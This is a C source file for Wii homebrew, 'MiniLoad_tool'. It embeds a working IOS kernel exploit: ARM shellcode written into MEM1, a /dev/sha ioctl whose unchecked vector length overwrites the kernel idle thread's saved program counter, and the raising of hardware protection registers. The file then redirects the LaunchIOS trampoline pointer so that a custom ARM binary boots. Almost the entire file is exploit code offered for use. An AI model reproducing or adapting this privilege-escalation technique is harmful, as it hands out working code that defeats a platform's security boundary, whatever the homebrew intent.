#include <stdio.h>
#include <stdlib.h>
#include <gccore.h>
#include <malloc.h>
#include <string.h>
#include <unistd.h>

#include "armboot_bin.h"

static void *xfb = NULL;
static GXRModeObj *rmode = NULL;

//--- Start of armbootnow ---
/*
    ios_hax.c - /dev/sha IOS exploit implementation
    by Emma / InvoxiPlayGames (https://ipg.gay)

    based on the work of https://github.com/mkwcat
    (exploit discovery, THUMB shellcode)
*/

#define HW_SRNPROT (*(uint32_t *)0xCD800060)
#define HW_AHBPROT (*(uint32_t *)0xCD800064)

uint32_t mem1_prepare[7] = {
    0x4903468D, // ldr r1, =0x10100000; mov sp, r1;
    0x49034788, // ldr r1, =entrypoint; blx r1;
    /* Overwrite reserved handler to loop infinitely */
    0x49036209, // ldr r1, =0xFFFF0014; str r1, [r1, #0x20];
    0x47080000, // bx r1
    0x10100000, // temporary stack
    0x41414141, // entrypoint
    0xFFFF0014, // reserved handler
};

uint32_t mem1_backup[7] = {0};

uint32_t arm_payload[] = {
    0xE3A04536, // mov r4, #0x0D800000
    // HW_AHBPROT = 0xFFFFFFFF
    0xE3E05000, // mov r5, #0xFFFFFFFF
    0xE5845064, // str r5, [r4, #0x64]
    // HW_SRNPROT |= 0x8
    0xE5945060, // ldr r5, [r4, #0x60]
    0xE3955008, // orrs r5, #0x8
    0xE5845060, // str r5, [r4, #0x60]
    0xE12FFF1E, // bx lr
};

bool IOSHAX_ClaimPPCKERN() {
    printf("AHBPROT: %08x\n", HW_AHBPROT);
    printf("SRNPROT: %08x\n", HW_SRNPROT);
    // check if we already have permissions
    if ((HW_AHBPROT & 0x80000000) == 0x80000000) {
        printf("already got PPCKERN\n");
        HW_SRNPROT |= 8;
        return true;
    }
    printf("need PPCKERN, elevate permissions\n");

    // backup the start, then copy our shellcode to mem1
    uint32_t *mem1 = (uint32_t *)0x80000000;
    memcpy(mem1_backup, mem1, sizeof(mem1_backup));
    memcpy(mem1, mem1_prepare, sizeof(mem1_prepare));
    // set our payload entrypoint
    mem1[5] = (uint32_t)MEM_K0_TO_PHYSICAL(arm_payload);
    DCFlushRange(mem1, 0x20);

    // open /dev/sha
    int fd = IOS_Open("/dev/sha", IPC_OPEN_NONE);
    // prepare our exploit ioctl
    ioctlv vec[3]; // 1 input, 2 output
    vec[0].data = NULL;
    vec[0].len = 0;
    // output SHA-1 context
    // exploit is here! this is kernel idle thread context
    // SHA1_Init will write 0 to the PC save here, since the length
    // of the vector is unchecked
    vec[1].data = (void *)0xFFFE0028;
    vec[1].len = 0;
    // cache consistency
    vec[2].data = MEM_K0_TO_PHYSICAL(0x80000000);
    vec[2].len = 0x20;
    // trigger!
    printf("triggering exploit...");
    IOS_Ioctlv(fd, 0, 1, 2, vec);
    sleep(1); // we have to wait a bit
    printf("returned from trigger\n");
    printf("AHBPROT: %08x\n", HW_AHBPROT);
    printf("SRNPROT: %08x\n", HW_SRNPROT);
    if ((HW_AHBPROT & 0x80000000) == 0x80000000) {
        printf("exploit successful\n");
        return true;
    } else {
        printf("exploit failed\n");
        return false;
    }
}

//--- End of armbootnow ---

// The code below is a copy paste of the main.c 
// from armbootnow with a couple tweaks

int main(int argc, char **argv) {
	// video and console init
	VIDEO_Init();
	rmode = VIDEO_GetPreferredMode(NULL);
	xfb = MEM_K0_TO_K1(SYS_AllocateFramebuffer(rmode));
	console_init(xfb,20,20,rmode->fbWidth,rmode->xfbHeight,rmode->fbWidth*VI_DISPLAY_PIX_SZ);
	VIDEO_Configure(rmode);
	VIDEO_SetNextFramebuffer(xfb);
	VIDEO_SetBlack(FALSE);
	VIDEO_Flush();
	VIDEO_WaitVSync();
	if(rmode->viTVMode&VI_NON_INTERLACE) VIDEO_WaitVSync();
	printf("\x1b[2;0H");

	printf("\nMiniLoad_tool\n Created by Abdelali221\n\n");

	uint32_t *armbuf = (uint32_t *)0x91000000;//memalign(0x20, filesize);
	memcpy(armbuf, armboot_bin, armboot_bin_size);
	DCFlushRange(armbuf, armboot_bin_size);

	// run IOS exploit to get permissions
	if (IOSHAX_ClaimPPCKERN()) {
		uint32_t *sram_ffff = (uint32_t *)0xCD410000; // start of IOS SRAM

		// find the "mov pc, r0" trampoline used to launch a new IOS image
		uint32_t trampoline_addr = 0;
		for (int i = 0; i < 0x1000; i++) {
			if (sram_ffff[i] == 0xE1A0F000) {
				trampoline_addr = 0xFFFF0000 + (i * 4);
				printf("found LaunchIOS trampoline at %08x\n", trampoline_addr);
				break;
			}
		}

		// if we found it, find the pointer to aforementioned trampoline
		// this is called in the function that launches the next kernel
		uint32_t trampoline_pointer = 0;
		int trampoline_off = 0;
		if (trampoline_addr != 0) {
			for (int i = 0; i < 0x1000; i++) {
				if (sram_ffff[i] == trampoline_addr) {
					trampoline_pointer = 0xFFFF0000 + (i * 4);
					trampoline_off = i;
					printf("found LaunchIOS trampoline pointer at %08x/%p\n", trampoline_pointer, &sram_ffff[i]);
					break;
				}
			}
		}
		// write the pointer to our code there instead
		sram_ffff[trampoline_off] = (uint32_t)MEM_K0_TO_PHYSICAL(armbuf) + armbuf[0];
		printf("set trampoline ptr to %08x\n", sram_ffff[trampoline_off]);

		// take the plunge...
		printf("launching...");
		IOS_ReloadIOS(IOS_GetVersion());
	}

	printf("something didn't work right! exiting in 10 seconds\n");
	
	sleep(10);
	exit(0);
	return 0;
}